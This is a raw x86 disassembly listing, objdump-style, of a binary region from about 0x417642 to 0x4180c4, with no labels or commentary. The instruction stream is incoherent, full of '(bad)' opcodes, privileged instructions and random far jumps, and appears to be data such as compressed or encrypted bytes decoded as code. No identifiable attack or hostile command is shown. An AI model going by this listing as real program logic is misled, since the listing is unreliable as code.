  417642:	ret    
  417643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417644:	xchg   edx,eax
  417645:	and    cl,BYTE PTR [eax+0x54]
  417648:	retf   
  417649:	ret    
  41764a:	out    0x98,al
  41764c:	adc    DWORD PTR [esi-0x4c],0xacae7e97
  417653:	and    al,0x89
  417655:	jae    0x417641
  417657:	loop   0x4175e2
  417659:	mov    ds:0x577b4d52,eax
  41765e:	(bad)  
  41765f:	mov    ds:0xa8ae0cce,eax
  417664:	(bad)
  417667:	push   ebp
  417668:	cmp    esi,0xa8f45cc4
	...
  4176d6:	test   eax,0xdf4fd367
  4176db:	(bad)  
  4176dc:	mov    ebp,0x411f24e7
  4176e1:	ficom  DWORD PTR [eax+0x6741f247]
  4176e7:	cld    
  4176e8:	add    BYTE PTR [eax],al
  4176ea:	add    BYTE PTR [ecx],al
  4176ec:	add    BYTE PTR [eax],al
  4176ee:	pop    es
  4176ef:	sahf   
  4176f0:	mov    DWORD PTR [esi-0x79],ebx
  4176f3:	mov    ch,0xf2
  4176f5:	push   esp
  4176f6:	popa   
  4176f7:	ja     0x4176ff
  4176f9:	cld    
  4176fa:	retf   0x1b47
  4176fd:	xchg   ecx,eax
  4176fe:	adc    BYTE PTR [esi],bl
  417700:	and    ah,bl
  417702:	jmp    0x1b63:0x98abf46e
  417709:	pop    edi
  41770a:	int3   
  41770b:	loope  0x417700
  41770d:	push   es
  41770e:	cld    
  41770f:	loope  0x417788
  417711:	xchg   edi,esi
  417713:	pavgw  mm7,QWORD PTR [ebx-0x7]
  417717:	(bad)  ds:0xf9fe7463
  41771d:	ds mov ecx,0x47c73095
  417723:	mov    dh,0x71
  417725:	retf   0x6349
  417728:	jae    0x417791
  41772a:	dec    ebp
  41772b:	push   esp
  41772c:	push   edi
  41772d:	inc    ebp
  41772e:	jae    0x4177ab
  417730:	sbb    eax,0xcd3aaeaa
  417735:	pop    ebp
  417736:	lods   al,BYTE PTR ds:[esi]
  417737:	adc    esp,ebp
  417739:	inc    edi
  41773a:	fistp  QWORD PTR [esi-0x1e]
  41773d:	jl     0x4176c0
  41773f:	xor    al,0x21
  417741:	and    bh,ch
  417743:	sub    eax,0x9d9b608b
  417748:	call   0xe4c8:0x8cb78c64
  41774f:	pop    es
  417750:	jns    0x417738
  417752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417753:	mov    ?,WORD PTR [esi+0x1d]
  417756:	dec    esi
  417757:	jmp    0xd05832d4
  41775c:	add    ecx,DWORD PTR [ebx]
  41775e:	nop
  41775f:	push   ss
  417760:	add    DWORD PTR [ecx],ebp
  417762:	std    
  417763:	pop    eax
  417764:	test   DWORD PTR [edi],esi
  417766:	adc    esp,DWORD PTR [edi+esi*1]
  417769:	aaa    
  41776a:	pop    ds
  41776b:	push   edx
  41776c:	clc    
  41776d:	std    
  41776e:	fcom   DWORD PTR [ecx+0x441d1f09]
  417774:	mov    al,ds:0xbc559713
  417779:	push   edx
  41777a:	push   esp
  41777b:	push   ds
  41777c:	ins    BYTE PTR es:[edi],dx
  41777d:	xor    DWORD PTR [edi+0x4b037e23],ebp
  417783:	in     al,dx
  417784:	imul   esp,DWORD PTR [edx],0x15
  417787:	mov    edi,0xa5d49b5e
  41778c:	std    
  41778d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41778e:	and    bl,BYTE PTR [edi]
  417790:	shl    eax,cl
  417792:	jb     0x417793
  417794:	sub    BYTE PTR [eax-0x3c437ee8],cl
  41779a:	retf   
  41779b:	dec    ecx
  41779c:	inc    ebx
  41779d:	jle    0x417720
  41779f:	pop    eax
  4177a0:	inc    ecx
  4177a1:	cmc    
  4177a2:	ret    
  4177a3:	push   esp
  4177a4:	test   al,0xb2
  4177a6:	mul    ebx
  4177a8:	push   eax
  4177a9:	sbb    al,0x6f
  4177ab:	jno    0x417804
  4177ad:	or     BYTE PTR [esi+0x4b778c04],0x66
  4177b4:	scas   eax,DWORD PTR es:[edi]
  4177b5:	push   cs
  4177b6:	push   0x39bf7053
  4177bb:	xor    cl,BYTE PTR [esi]
  4177bd:	or     dl,BYTE PTR [ebx-0x68]
  4177c0:	dec    ebx
  4177c1:	xchg   ebp,eax
  4177c2:	ss pop esp
  4177c4:	adc    eax,0xebd3fc91
  4177c9:	rol    DWORD PTR [ecx-0x17],1
  4177cc:	sbb    DWORD PTR [edx+ebx*1-0x1],0xffffff90
  4177d1:	xor    DWORD PTR [ebx-0x1a2aea60],edx
  4177d7:	pop    esi
  4177d8:	cmp    eax,0x3df4b52
  4177dd:	jge    0x4177a9
  4177df:	enter  0xc6c9,0xaf
  4177e3:	out    0x40,eax
  4177e5:	xlat   BYTE PTR ds:[ebx]
  4177e6:	dec    eax
  4177e7:	pop    esi
  4177e8:	icebp  
  4177e9:	sub    DWORD PTR [eax+0x26],0xffffffbc
  4177ed:	dec    esp
	...
  417856:	jmp    0xff597669
  41785b:	imul   ecx
  41785d:	(bad)  
  41785e:	lahf   
  41785f:	repnz and dl,dl
  417862:	jmp    0x4177eb
  417864:	fcmovb st,st(2)
  417866:	addr16 std 
  417868:	add    BYTE PTR [eax],al
  41786a:	add    BYTE PTR [ecx],al
  41786c:	add    BYTE PTR [eax],al
  41786e:	mov    ds,WORD PTR [ebx+esi*8-0x159b1988]
  417875:	fmul   QWORD PTR [esp+ebp*8]
  417878:	push   es
  417879:	mov    dh,0x12
  41787b:	pop    eax
  41787c:	adc    eax,0x200a1b50
  417881:	sub    DWORD PTR [ebp-0x2b],ebp
  417884:	cwde   
  417885:	loopne 0x4178f3
  417887:	stc    
  417888:	popf   
  417889:	xor    BYTE PTR [edi],0xf8
  41788c:	dec    esp
  41788d:	je     0x4178b4
  41788f:	inc    esi
  417890:	pushf  
  417891:	sub    eax,0xc68c4447
  417896:	dec    edi
  417897:	imul   ebx,DWORD PTR [eax+edi*2],0x32a84502
  41789e:	fidivr DWORD PTR [eax+0x14521a7d]
  4178a4:	test   eax,0x946b97fb
  4178a9:	and    al,0x1a
  4178ab:	mov    ecx,0x8842ae49
  4178b0:	add    eax,0xba9d628e
  4178b5:	mov    dl,0x98
  4178b7:	xor    eax,0x2ba7f6d5
  4178bc:	cmp    eax,0x94550480
  4178c1:	mov    ebx,0x68a9e45
  4178c6:	xchg   esi,eax
  4178c7:	pop    esi
  4178c8:	add    ebx,0x47
  4178cb:	mov    fs,WORD PTR [edx+0x392e3131]
  4178d1:	mov    cl,0xb7
  4178d3:	out    0x30,al
  4178d5:	dec    ecx
  4178d6:	pusha  
  4178d7:	or     BYTE PTR [esi],0xee
  4178da:	test   BYTE PTR [esi+edx*2],al
  4178dd:	lahf   
  4178de:	lock sub esi,DWORD PTR [ecx]
  4178e1:	jl     0x4178b5
  4178e3:	sub    bl,bh
  4178e5:	jge    0x417898
  4178e7:	(bad)  
  4178e8:	outs   dx,DWORD PTR ds:[esi]
  4178e9:	jno    0x4178ec
  4178eb:	push   esi
  4178ec:	jp     0x4178c6
  4178ee:	mov    edx,0xf27ad225
  4178f3:	cmp    BYTE PTR [ebx+0x49ec0108],ch
  4178f9:	fdivr  QWORD PTR [ebx+esi*1-0x5b]
  4178fd:	mov    ds:0x35c4f17b,eax
  417902:	dec    eax
  417903:	add    edx,DWORD PTR [esi]
  417905:	xor    al,0x3f
  417907:	lods   al,BYTE PTR ds:[esi]
  417908:	(bad)  
  417909:	fucomip st,st(3)
  41790b:	lods   eax,DWORD PTR ds:[esi]
  41790c:	adc    DWORD PTR [edi-0x1d8c53d],ebp
  417912:	cmp    eax,0x5fc6cdbe
  417917:	fcomp  st(4)
  417919:	int    0xb6
  41791b:	ss repz and ecx,ecx
  41791f:	fdivr  st,st(1)
  417921:	inc    ebp
  417922:	mov    al,0x8f
  417924:	jge    0x41794c
  417926:	jmp    0xa195:0x211c0081
  41792d:	inc    eax
  41792e:	outs   dx,BYTE PTR ds:[esi]
  41792f:	pop    eax
  417930:	ud1    esi,DWORD PTR [ebx]
  417933:	lods   al,BYTE PTR ds:[esi]
  417934:	adc    DWORD PTR [ebp*2+0xdd7c6ab],edi
  41793b:	ror    DWORD PTR [edx+0x28be9bfd],0x86
  417942:	jne    0x4178ec
  417944:	add    BYTE PTR [ecx],bh
  417946:	mov    al,0xdd
  417948:	popa   
  417949:	sub    eax,0x1da74037
  41794e:	test   BYTE PTR [edi+0x4bd66ce7],dh
  417954:	rcl    BYTE PTR [ebx+0x2d345163],0x78
  41795b:	(bad)  
  41795e:	inc    ebx
  41795f:	and    edx,ebp
  417961:	ret    
  417962:	mov    ds:0x4f1eab38,al
  417967:	out    dx,eax
  417968:	retf   0xcc58
  41796b:	mov    ds:0x83e1,eax
	...
  4179d4:	add    BYTE PTR [eax],al
  4179d6:	pop    eax
  4179d7:	inc    ecx
  4179d8:	pop    ds
  4179d9:	lods   eax,DWORD PTR ds:[esi]
  4179da:	pop    ds
  4179db:	(bad)  
  4179dc:	cli    
  4179dd:	cmc    
  4179de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179df:	retf   0xe5d4
  4179e2:	mov    al,BYTE PTR [ebp-0x19813ae]
  4179e8:	add    BYTE PTR [eax],al
  4179ea:	add    BYTE PTR [ecx],al
  4179ec:	add    BYTE PTR [eax],al
  4179ee:	retf   0xde8d
  4179f1:	adc    al,0x10
  4179f3:	daa    
  4179f4:	jmp    0x417a4c
  4179f6:	xor    al,0xd6
  4179f8:	push   ebx
  4179f9:	xchg   edx,eax
  4179fa:	adc    esp,DWORD PTR [di+0x52]
  4179fe:	lock rol DWORD PTR [eax+edx*2-0x64],1
  417a03:	out    dx,al
  417a04:	loopne 0x417a2e
  417a06:	adc    eax,0x8525dccb
  417a0b:	fisttp QWORD PTR [edx+0x65b77a11]
  417a11:	test   eax,0xfd01c347
  417a16:	(bad)  
  417a17:	ror    DWORD PTR [ebx-0x20],1
  417a1a:	ss out dx,al
  417a1c:	dec    esi
  417a1d:	cmc    
  417a1e:	shr    esi,cl
  417a20:	std    
  417a21:	imul   edx,DWORD PTR [ecx-0x13ef9f64],0x4e8d83a7
  417a2b:	aad    0x97
  417a2d:	js     0x417a1d
  417a2f:	aas    
  417a30:	dec    edi
  417a31:	inc    esp
  417a32:	and    DWORD PTR [esi-0x235a3b6f],edx
  417a38:	mov    ah,0x27
  417a3a:	enter  0x5b31,0x1b
  417a3e:	ret    0x6279
  417a41:	or     BYTE PTR [eax-0x12],ch
  417a44:	and    DWORD PTR [edi-0x2f80d62f],esi
  417a4a:	test   eax,edx
  417a4c:	add    ch,BYTE PTR [ebx-0x40]
  417a4f:	test   DWORD PTR [edx],0xd95bbd58
  417a55:	jo     0x4179da
  417a57:	into   
  417a58:	mov    ss,ebx
  417a5a:	push   ebp
  417a5b:	mov    ebx,0x92113706
  417a60:	xlat   BYTE PTR ds:[ebx]
  417a61:	retf   
  417a62:	repz add DWORD PTR ds:0x42f4fe,edx
  417a69:	add    bl,BYTE PTR [edi]
  417a6b:	wbinvd 
  417a6d:	fidivr DWORD PTR [ecx-0x47]
  417a70:	je     0x417a01
  417a72:	in     al,0xa9
  417a74:	cmp    bl,BYTE PTR ds:0x3e603f68
  417a7a:	xor    eax,0x58c5c87
  417a7f:	or     esi,eax
  417a81:	lods   eax,DWORD PTR ds:[esi]
  417a82:	jmp    0x417a56
  417a84:	(bad)  
  417a85:	leave  
  417a86:	icebp  
  417a87:	push   ds
  417a88:	out    0x31,eax
  417a8a:	sub    dl,BYTE PTR [eax+0x250e8c11]
  417a90:	leave  
  417a91:	xchg   ecx,eax
  417a92:	mov    ecx,0xbc8ca599
  417a97:	mov    eax,0xa0d03ae8
  417a9c:	inc    ebp
  417a9d:	pop    esp
  417a9e:	verr   WORD PTR [edi+0x22]
  417aa2:	mov    ecx,0x9ac518fe
  417aa7:	xor    ebx,esp
  417aa9:	sbb    BYTE PTR [ecx+esi*8-0x346ef988],0x84
  417ab1:	add    al,0xf0
  417ab3:	sub    ebx,DWORD PTR [edi]
  417ab5:	retf   0xa1f
  417ab8:	xor    esp,DWORD PTR [eax]
  417aba:	mov    edx,0xe4064e0e
  417abf:	mov    bl,0xf0
  417ac1:	inc    ebp
  417ac2:	scas   eax,DWORD PTR es:[edi]
  417ac3:	(bad)  
  417ac4:	pop    ds
  417ac5:	inc    ecx
  417ac6:	std    
  417ac7:	pop    esi
  417ac8:	jno    0x417a74
  417aca:	xlat   BYTE PTR ds:[ebx]
  417acb:	cmp    BYTE PTR [edx-0x4d],bh
  417ace:	imul   ecx,esi,0xdcbc4323
  417ad4:	and    edi,0x2f9ea240
  417ada:	inc    ebx
  417adb:	push   ds
  417adc:	or     cl,BYTE PTR [esi+0x2a4210c3]
  417ae2:	dec    ebx
  417ae3:	loop   0x417ac9
  417ae5:	aad    0x2f
  417ae7:	daa    
  417ae8:	rcr    DWORD PTR [ebp-0x4c68de2a],0x0
	...
  417b53:	add    BYTE PTR [eax],al
  417b55:	add    BYTE PTR [edi],ch
  417b57:	stos   DWORD PTR es:[edi],eax
  417b58:	cdq    
  417b59:	inc    ecx
  417b5a:	popf   
  417b5b:	jae    0x417b5c
  417b5d:	out    dx,eax
  417b5e:	(bad)  [eax]
  417b60:	xor    ebx,DWORD PTR [ecx+0x7c049ec2]
  417b66:	inc    DWORD PTR [bx+si]
  417b69:	add    BYTE PTR [eax],al
  417b6b:	add    DWORD PTR [eax],eax
  417b6d:	add    bl,dl
  417b6f:	js     0x417bc7
  417b71:	ret    
  417b72:	xchg   BYTE PTR [ebp-0x42595f17],dh
  417b78:	cdq    
  417b79:	add    eax,DWORD PTR [ecx]
  417b7b:	ror    DWORD PTR [edi],0xeb
  417b7e:	xlat   BYTE PTR ds:[ebx]
  417b7f:	out    dx,al
  417b80:	fdiv   st(7),st
  417b82:	clc    
  417b83:	(bad)  
  417b84:	push   esi
  417b85:	and    DWORD PTR [edi+0x33],0xffffffd2
  417b89:	fcmove st,st(5)
  417b8b:	mul    BYTE PTR [ecx]
  417b8d:	dec    edx
  417b8e:	into   
  417b8f:	xchg   ebp,edi
  417b91:	fwait
  417b92:	cmp    ah,al
  417b94:	dec    edx
  417b95:	test   BYTE PTR [eax+0x19],dh
  417b98:	retf   0xe40b
  417b9b:	sbb    esp,DWORD PTR [ebp+0x6b]
  417b9e:	sbb    esp,esi
  417ba0:	xchg   ebx,eax
  417ba1:	outs   dx,DWORD PTR ds:[esi]
  417ba2:	fwait
  417ba3:	xor    BYTE PTR [esi+eax*1-0x60],dl
  417ba7:	daa    
  417ba8:	or     edi,DWORD PTR [edx+0xd]
  417bab:	cmc    
  417bac:	ins    BYTE PTR es:[edi],dx
  417bad:	inc    esi
  417bae:	pop    ds
  417baf:	dec    esi
  417bb0:	jne    0x417b6e
  417bb2:	test   BYTE PTR [edi+eax*8+0x0],bh
  417bb6:	shr    DWORD PTR [ecx+0x66],1
  417bb9:	mov    BYTE PTR [edi+0x38a63003],cl
  417bbf:	pop    ds
  417bc0:	outs   dx,DWORD PTR ds:[esi]
  417bc1:	dec    edi
  417bc2:	cmp    bh,BYTE PTR [ecx+eax*4+0x14]
  417bc6:	xchg   edi,eax
  417bc7:	scas   al,BYTE PTR es:[edi]
  417bc8:	dec    ecx
  417bc9:	stos   DWORD PTR es:[edi],eax
  417bca:	(bad)  
  417bcb:	enter  0x2496,0x4a
  417bcf:	aaa    
  417bd0:	jne    0x417c3f
  417bd2:	push   es
  417bd3:	gs jle 0x417ba1
  417bd6:	adc    eax,eax
  417bd8:	jbe    0x417c32
  417bda:	cld    
  417bdb:	push   ds
  417bdc:	mov    BYTE PTR [eax],al
  417bde:	jb     0x417c33
  417be0:	inc    esp
  417be1:	jle    0x417c19
  417be3:	mov    dh,0xfe
  417be5:	pop    es
  417be6:	retf   
  417be7:	mov    ch,dh
  417be9:	jbe    0x417c4b
  417beb:	sbb    BYTE PTR ss:[esi+0x55],al
  417bef:	inc    edi
  417bf0:	mov    ds:0x7a37c5c2,eax
  417bf5:	stos   BYTE PTR es:[edi],al
  417bf6:	shl    ebp,0x52
  417bf9:	sub    ah,0x9d
  417bfc:	ret    0xe547
  417bff:	addr16 mov edx,0x7f0112d3
  417c05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c06:	mov    esp,0x6d50394a
  417c0b:	sub    bl,BYTE PTR [ebx-0x4767543a]
  417c11:	dec    ebx
  417c12:	sub    eax,0xeb065e6c
  417c17:	loop   0x417bdb
  417c19:	cmp    al,0xb0
  417c1b:	jb     0x417c2c
  417c1d:	nop
  417c1e:	push   0x6a
  417c20:	nop
  417c21:	cmp    edi,DWORD PTR [ebp-0x42]
  417c24:	sub    eax,0xb71ec054
  417c29:	mov    esi,0x590ce1b3
  417c2e:	mov    ah,BYTE PTR [esi-0x4df417d5]
  417c34:	adc    ebp,ebx
  417c36:	push   eax
  417c37:	adc    DWORD PTR [edi+0x3b],0x38
  417c3b:	dec    edi
  417c3c:	sahf   
  417c3d:	and    dl,BYTE PTR [ecx-0x75]
  417c40:	sbb    ebp,DWORD PTR [ecx-0x22b9a4c8]
  417c46:	enter  0x2bb6,0x36
  417c4a:	xor    DWORD PTR [edi-0xe],0xfffffff7
  417c4e:	out    dx,al
  417c4f:	icebp  
  417c50:	lock mov bh,0x6b
  417c53:	(bad)  
  417c54:	push   cs
  417c55:	push   edi
  417c56:	xor    ah,BYTE PTR [ebx-0x30]
  417c59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c5a:	pusha  
  417c5b:	rol    BYTE PTR [edx],1
  417c5d:	add    ecx,0x62ac5928
  417c63:	stc    
  417c64:	std    
  417c65:	xchg   DWORD PTR [ebx+ebp*1+0xc],edi
  417c69:	out    dx,al
  417c6a:	loopne 0x417c75
  417c6c:	pop    ebx
  417c6d:	dec    eax
	...
  417cd6:	mov    eax,eax
  417cd8:	nop
  417cd9:	test   cl,bl
  417cdb:	aam    0x9d
  417cdd:	int    0x75
  417cdf:	aaa    
  417ce0:	das    
  417ce1:	aam    0xfc
  417ce3:	mov    esp,0x1006723
  417ce9:	add    BYTE PTR [eax],al
  417ceb:	add    DWORD PTR [eax],eax
  417ced:	add    BYTE PTR [esi-0x41f8d439],dl
  417cf3:	dec    ecx
  417cf4:	outs   dx,DWORD PTR ds:[esi]
  417cf5:	shr    DWORD PTR [esi+0x43c38d1d],0x2c
  417cfc:	retf   
  417cfd:	push   es
  417cfe:	jne    0x417ca0
  417d00:	call   0x2e7:0x99ae484d
  417d07:	aam    0x2d
  417d09:	mov    ah,0x40
  417d0b:	repz jne 0x417cc1
  417d0e:	and    DWORD PTR [ebx+0x3db6241f],0xffffffa5
  417d15:	test   DWORD PTR [ecx-0x132000db],0xb848a799
  417d1f:	cdq    
  417d20:	or     ecx,ebx
  417d22:	sbb    ecx,DWORD PTR [eax+esi*4-0x24]
  417d26:	sahf   
  417d27:	dec    esp
  417d28:	sub    bl,BYTE PTR [ebx+0x34]
  417d2b:	int3   
  417d2c:	lea    edx,[eax-0x4c9c9c41]
  417d32:	scas   eax,DWORD PTR es:[edi]
  417d33:	and    ebx,esp
  417d35:	mov    dl,0x56
  417d37:	es rcr dl,1
  417d3a:	adc    DWORD PTR [edx-0x24b76f0b],ebp
  417d40:	(bad)  
  417d41:	ins    BYTE PTR es:[edi],dx
  417d42:	vcvtss2sd xmm4,xmm2,xmm7
  417d47:	stos   BYTE PTR es:[edi],al
  417d48:	xchg   BYTE PTR [edx+0x166844eb],cl
  417d4e:	imul   ecx,DWORD PTR [edi],0xffffffce
  417d51:	add    DWORD PTR [edi],0xf2acc35d
  417d57:	daa    
  417d58:	jg     0x417dbd
  417d5a:	lahf   
  417d5b:	xchg   ebp,eax
  417d5c:	inc    esp
  417d5d:	xchg   esi,eax
  417d5e:	fstp   TBYTE PTR [ecx+0x37]
  417d61:	add    DWORD PTR [edi],esp
  417d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d64:	fs (bad) 
  417d66:	fldcw  WORD PTR [edi]
  417d68:	push   0xb
  417d6a:	hlt    
  417d6b:	popf   
  417d6c:	das    
  417d6d:	stc    
  417d6e:	sti    
  417d6f:	jmp    0x417d83
  417d71:	sti    
  417d72:	mov    edx,0x9426ba07
  417d77:	add    cl,0xa7
  417d7a:	jmp    0xaaa0:0xd44cf875
  417d81:	mov    al,ds:0x40d87d0
  417d86:	push   ss
  417d87:	mov    esi,0x9f4ec56a
  417d8c:	cmp    esp,DWORD PTR [esi+0x62]
  417d8f:	mov    DWORD PTR [ecx],ecx
  417d91:	xchg   ebp,eax
  417d92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d93:	xchg   esp,eax
  417d94:	jne    0x417d37
  417d96:	das    
  417d97:	stc    
  417d98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d99:	js     0x417dda
  417d9b:	ins    DWORD PTR es:[edi],dx
  417d9c:	in     eax,0xfa
  417d9e:	clc    
  417d9f:	cli    
  417da0:	xlat   BYTE PTR ds:[ebx]
  417da1:	xor    eax,0xde651bac
  417da6:	arpl   WORD PTR [eax],si
  417da8:	xchg   ebx,eax
  417da9:	je     0x417d6a
  417dab:	jae    0x417e21
  417dad:	ins    DWORD PTR es:[edi],dx
  417dae:	jle    0x417d7f
  417db0:	push   ss
  417db1:	popa   
  417db2:	scas   al,BYTE PTR es:[edi]
  417db3:	adc    edi,esp
  417db5:	add    BYTE PTR [edi-0x484a315c],ch
  417dbb:	mov    al,0x4b
  417dbd:	jecxz  0x417d94
  417dbf:	push   ecx
  417dc0:	cli    
  417dc1:	ror    BYTE PTR [esi],cl
  417dc3:	test   al,0x53
  417dc5:	fmul   DWORD PTR [edx-0x6addc8b2]
  417dcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417dcc:	pop    ebx
  417dcd:	(bad)  
  417dce:	xchg   ebx,eax
  417dcf:	jecxz  0x417de3
  417dd1:	leave  
  417dd2:	or     BYTE PTR [ebx-0x35],bh
  417dd5:	mov    dh,0x74
  417dd7:	xor    dh,BYTE PTR [edi]
  417dd9:	xchg   esi,eax
  417dda:	retf   0x3354
  417ddd:	test   DWORD PTR [edi-0x3f676b79],0x9a9cfe41
  417de7:	sbb    al,BYTE PTR [edi+ebp*8]
  417dea:	push   ebp
  417deb:	xlat   BYTE PTR ds:[ebx]
  417dec:	inc    edi
  417ded:	pop    eax
	...
  417e56:	pop    ss
  417e57:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417e5d:	addr16 dec esi
  417e5f:	sub    BYTE PTR [ecx+0x46],ch
  417e62:	lea    edi,[edi+0x5e]
  417e65:	inc    esp
  417e66:	add    DWORD PTR [bx+di],eax
  417e69:	add    BYTE PTR [eax],al
  417e6b:	add    DWORD PTR [eax],eax
  417e6d:	add    BYTE PTR [ebp+0x25dd2ba9],cl
  417e73:	and    eax,0x35862124
  417e78:	mov    ebx,0x1faa0ccb
  417e7d:	mov    al,0x61
  417e7f:	cmc    
  417e80:	bswap  esi
  417e82:	adc    dh,bh
  417e84:	aam    0x38
  417e86:	ss jmp 0x417e7a
  417e89:	imul   ebx,DWORD PTR [ebx-0xe],0x3c
  417e8d:	sub    ch,BYTE PTR [eax]
  417e8f:	in     eax,dx
  417e90:	inc    edx
  417e91:	mov    edi,0x5906f58
  417e96:	or     ebx,DWORD PTR [ebp+0x145702b2]
  417e9c:	mov    es,WORD PTR [ebx+0x2a944e06]
  417ea2:	lock mov edx,0x5e12677e
  417ea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ea9:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  417eab:	data16 adc BYTE PTR [ecx],bl
  417eae:	dec    eax
  417eaf:	push   0xffffffeb
  417eb1:	into   
  417eb2:	mov    WORD PTR [ecx-0x2aa58a42],ss
  417eb8:	call   0xf16e928d
  417ebd:	cwde   
  417ebe:	aam    0xf8
  417ec0:	mov    bh,0x2
  417ec2:	std    
  417ec3:	call   0x14c5:0x903a4c2
  417eca:	aas    
  417ecb:	adc    edx,edx
  417ecd:	add    edx,edx
  417ecf:	lods   eax,DWORD PTR ds:[esi]
  417ed0:	or     cl,bl
  417ed2:	xlat   BYTE PTR ds:[ebx]
  417ed3:	and    edi,DWORD PTR [ecx]
  417ed5:	popa   
  417ed6:	push   edi
  417ed7:	(bad)  
  417ed8:	adc    edx,DWORD PTR [esi+0xd]
  417edb:	mov    BYTE PTR ds:[ebx-0x7d256301],ah
  417ee2:	das    
  417ee3:	jnp    0x417ea7
  417ee5:	inc    esi
  417ee6:	xchg   edi,eax
  417ee7:	xchg   esi,eax
  417ee8:	aas    
  417ee9:	add    eax,0x46aebab
  417eee:	test   BYTE PTR ss:[eax-0x57d40b85],bl
  417ef5:	jmp    0x5de8:0x8a515597
  417efc:	repnz push ds
  417efe:	mov    edx,0x4f57d498
  417f03:	xchg   ah,cl
  417f05:	add    ah,0xd4
  417f08:	in     eax,dx
  417f09:	repnz add al,0x6b
  417f0c:	dec    ebx
  417f0d:	icebp  
  417f0e:	xchg   esi,eax
  417f0f:	pop    ebx
  417f10:	imul   ebp,DWORD PTR [edi+0x36],0xf26c053
  417f17:	push   edi
  417f18:	xchg   eax,ecx
  417f1a:	pop    esp
  417f1b:	pop    esi
  417f1c:	adc    eax,0xd782ae06
  417f21:	outs   dx,DWORD PTR ds:[esi]
  417f22:	jp     0x417f28
  417f24:	enter  0x76fd,0xaf
  417f28:	aad    0x65
  417f2a:	cmp    dl,BYTE PTR [ecx-0x2d]
  417f2d:	fnstsw WORD PTR [ebx+0x24]
  417f30:	mov    eax,0xe716c643
  417f35:	adc    ebp,eax
  417f37:	fwait
  417f38:	push   ecx
  417f39:	loop   0x417ee9
  417f3b:	inc    eax
  417f3c:	test   DWORD PTR [edx-0x43c023e0],0x6b32716
  417f46:	fmul   DWORD PTR [esi-0x45]
  417f49:	je     0x417ef5
  417f4b:	and    BYTE PTR [esp+edx*4-0x4bc15717],0x25
  417f53:	ret    
  417f54:	sub    ecx,DWORD PTR [edx-0x7f]
  417f57:	mov    esp,0x341c5820
  417f5c:	aad    0x8d
  417f5e:	add    DWORD PTR [ecx-0x36],ebp
  417f61:	shl    BYTE PTR [ebp+0x1b7fdca3],cl
  417f67:	ins    DWORD PTR es:[edi],dx
  417f68:	pop    esp
  417f69:	fs push 0xffffffa9
  417f6c:	jmp    0x417fa5
	...
  417fd6:	(bad)  
  417fd7:	out    0xe6,al
  417fd9:	cmp    esp,esi
  417fdb:	cmp    edi,edi
  417fdd:	push   DWORD PTR [edx]
  417fdf:	xchg   edx,eax
  417fe0:	xor    al,bh
  417fe2:	into   
  417fe3:	inc    esp
  417fe4:	add    cl,BYTE PTR [ebx]
  417fe6:	add    al,BYTE PTR [bx+di]
  417fe9:	add    BYTE PTR [eax],al
  417feb:	add    DWORD PTR [eax],eax
  417fed:	add    BYTE PTR [eax+0x28],dh
  417ff0:	fdivp  st(0),st
  417ff2:	xchg   ecx,eax
  417ff3:	icebp  
  417ff4:	cli    
  417ff5:	ja     0x418032
  417ff7:	xor    DWORD PTR [esi+0x30e3511d],ecx
  417ffd:	jmp    FWORD PTR [edx]
  417fff:	xchg   edx,eax
  418000:	js     0x417faa
  418002:	adc    DWORD PTR ds:0xba6e2501,esi
  418008:	pop    ss
  418009:	psubsb mm5,QWORD PTR [eax+esi*2]
  41800d:	je     0x417f94
  41800f:	mov    ebx,DWORD PTR [edi+0x898655d]
  418015:	xor    DWORD PTR [ebx],esi
  418017:	mov    eax,0xe1e26a0d
  41801c:	xor    al,0xa2
  41801e:	aad    0x85
  418020:	cmp    al,0x71
  418022:	in     al,dx
  418023:	xchg   ebx,eax
  418024:	adc    al,0x0
  418026:	add    DWORD PTR [edx-0x10bb13f2],0xffffffad
  41802d:	dec    ebx
  41802e:	fidiv  DWORD PTR [eax+ecx*1-0x188e2408]
  418035:	xchg   edi,eax
  418036:	pop    eax
  418037:	and    al,0x1d
  418039:	call   0xb36b:0x82207264
  418040:	inc    ebp
  418041:	ret    0xd8d5
  418044:	mov    gs,WORD PTR [edx+0x48]
  418047:	int3   
  418048:	retf   
  418049:	in     eax,0x47
  41804b:	aam    0xe2
  41804d:	jge    0x4180af
  41804f:	retf   
  418050:	lods   al,BYTE PTR ds:[esi]
  418051:	call   0xdd1d5547
  418056:	gs sbb eax,esp
  418059:	sub    DWORD PTR [esi-0x1da42314],0xffffff83
  418060:	cmp    BYTE PTR [ebp-0x6345b1cf],ah
  418066:	cmp    BYTE PTR [edx+ebx*8-0xa0de636],al
  41806d:	xchg   ecx,eax
  41806e:	shr    BYTE PTR [edx+edi*2-0x3a46fb69],0x35
  418076:	data16 mov ?,WORD PTR [eax-0x5c]
  41807a:	and    eax,0xc939648c
  41807f:	icebp  
  418080:	lods   al,BYTE PTR ds:[esi]
  418081:	adc    eax,0xa63d4783
  418086:	add    ecx,DWORD PTR [esi+0x1d3c7551]
  41808c:	xchg   edi,eax
  41808d:	ins    DWORD PTR es:[di],dx
  41808f:	and    cl,BYTE PTR [esi]
  418091:	shr    DWORD PTR [edi+ebp*4+0x28b908fc],cl
  418098:	pop    ebp
  418099:	ret    0x1673
  41809c:	jmp    0x95a4:0x506e347a
  4180a3:	popf   
  4180a4:	(bad)  
  4180a5:	push   cs
  4180a6:	repnz and dl,BYTE PTR [edi+esi*8]
  4180aa:	cmp    dh,BYTE PTR [esi]
  4180ac:	xchg   DWORD PTR ds:0x4d1cb22d,esi
  4180b2:	mov    ecx,0xccbd4f63
  4180b7:	lds    ecx,FWORD PTR [esi+ebx*4-0x7238aa40]
  4180be:	icebp  
  4180bf:	stc    
  4180c0:	data16 das 
  4180c2:	mov    bl,0x5f
  4180c4:	xchg   edi,eax
